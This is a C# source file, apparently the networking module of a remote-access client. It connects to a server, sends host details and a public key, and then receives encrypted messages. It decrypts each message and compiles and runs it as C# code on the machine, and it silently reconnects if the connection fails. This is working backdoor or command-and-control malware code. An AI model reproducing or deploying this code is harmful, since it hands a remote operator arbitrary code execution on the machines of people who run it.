using System.IO;
using System.Net.Sockets;
using System.Text;
using Client.Helper;

namespace Client.Communication
{
    public static class Network
    {
        public static NetworkStream Stream;
        public static void Listen()
        {
            try
            {
                TcpClient client = new TcpClient("127.0.0.1", 1234);
                Console.WriteLine("Connected to server.");

                Stream = client.GetStream();

                Thread.Sleep(2000);

                Communication.Network.Send(ClientInfo.GetClientInfo(Program.pubKeyString));

                Thread receiveThread = new Thread(() =>
                {
                    while (true)
                    {
                        byte[] messageBytes = new byte[1024];
                        int bytesRead = Stream.Read(messageBytes, 0, messageBytes.Length);
                        string message = Encoding.ASCII.GetString(messageBytes, 0, bytesRead);

                        CommandHandler.Handler.CheckMessageForCommands(message);

                        if (Program.canNowSendSymEncrypted)
                        {
                            if (!Program.reservedKeywords.Any(keyword => message.Contains(keyword)))
                            {
                                message = Communication.Encryption.AES.Decrypt(ClientInfo.clientInfoModel.SymKey, message);
                                RuntimeCompiler.CompileCSharp(message).Wait();
                                //Console.WriteLine("Server: " + message);
                            }
                        }
                    }
                });
                receiveThread.Start();
            }
            catch
            {
                Listen();
            }
        }

        public static void Send(string message, string flag = "")
        {
            if(Program.canNowSendSymEncrypted)
            {
                //Message wird symmetrisch verschlüsselt und Client-ID wird mitgesendet, damit der Server weiß, welchen Sym-Key er verwenden muss
                string encryptedMessage = Communication.Encryption.AES.Encrypt(ClientInfo.clientInfoModel.SymKey, message);
                Thread sendThread = new Thread(() =>
                {
                    byte[] messageBytes = Encoding.ASCII.GetBytes($"encryptedmessage!{flag}!{ClientInfo.clientInfoModel.Id}!{encryptedMessage}");
                    Stream.Write(messageBytes, 0, messageBytes.Length);
                });
                sendThread.Start();
            }
            else
            {
                Thread sendThread = new Thread(() =>
                {
                    byte[] messageBytes = Encoding.ASCII.GetBytes($"{flag}{message}");
                    Stream.Write(messageBytes, 0, messageBytes.Length);
                });
                sendThread.Start();
            }
        }
    }
}
